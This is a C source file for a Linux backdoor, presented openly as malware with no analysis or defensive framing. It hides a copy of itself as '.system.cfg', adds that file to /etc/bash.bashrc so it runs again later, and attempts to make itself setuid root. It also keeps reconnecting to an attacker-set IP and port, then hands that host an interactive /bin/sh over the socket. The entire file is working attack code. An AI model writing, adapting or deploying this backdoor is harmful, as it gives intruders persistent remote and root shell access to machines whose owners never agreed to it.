#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <sys/types.h>
#include <fcntl.h>
int sfd;
int check_infection(){
    int vfd=open(".system.cfg",O_RDONLY);
    if (vfd==-1){
      return 1;
}
    else{
      close(vfd);
      return 0;
}
}

static int rcs(){
    sfd=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    int cnt;
    while (1){

    cnt=connect(sfd,(struct sockaddr*)&ad,sizeof(ad));
    if (cnt==-1){sleep(15);}
    else{
      setuid(0);
      seteuid(0);
      if (getuid()==0){
      send(sfd,"[+] Board Reverse Root Shell Opened\n",sizeof("[+] Board Reverse Root Shell Opened\n"),0);
      break;
      }
      else{
      send (sfd,"[+] Board Reverse Shell Oppened\n",sizeof("[+] Board Reverse Shell Oppened\n"),0);
      break;

}

}
}
}
int spawn_in_kernel() {

 int pid=fork();
 if (pid<0){}
 if (pid>0){exit(0);}
  int sid=setsid();
  if (sid<0){}

}


int main(int argc,char*argv[]){

    spawn_in_kernel();  // Run Reverse Shell In Kernel
    char inject_in_etc[51]="cat ";
    char inject_destination[19]="> .system.cfg";
    strcat(inject_in_etc,argv[0]);
    strcat(inject_in_etc,inject_destination);
    strncat(inject_in_etc,"\0",1);

    setuid(0);
    seteuid(0);
    if (check_infection()==1){
    system(inject_in_etc);
    system("touch .system.cfg && chmod +x .system.cfg && echo $PWD/.system.cfg >> /etc/bash.bashrc &");
}

    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    rcs();
    if (geteuid()==0){
      char exploit_suid[200]="chown root:root ";
      char nd[]=" && ";
      char continu_e[]="chmod +s ";
      strcat(exploit_suid,argv[0]);
      strcat(exploit_suid,nd);
      strcat(exploit_suid,continu_e);
      strcat(exploit_suid,argv[0]);
      strncat(exploit_suid,"\0",1);
      system(exploit_suid);
      setuid(0);
      seteuid(0);
      send(sfd,"[!] SETUID Exploited - Root Access Granted\n",sizeof("[!] SETUID Exploited - Root Access Granted\n"),0);
}

    send(sfd,"[+] Board Reverse Shell Opened\n",25,0);
    close(0);close(1);close(2);
    dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);
    while (1){
      system("/bin/sh");
      send(sfd,"Press CTRL+C To Exit\n",21,0);
      close(sfd);
      rcs();
      close(0);close(1);close(2);
      dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);

}
    return 0;
}
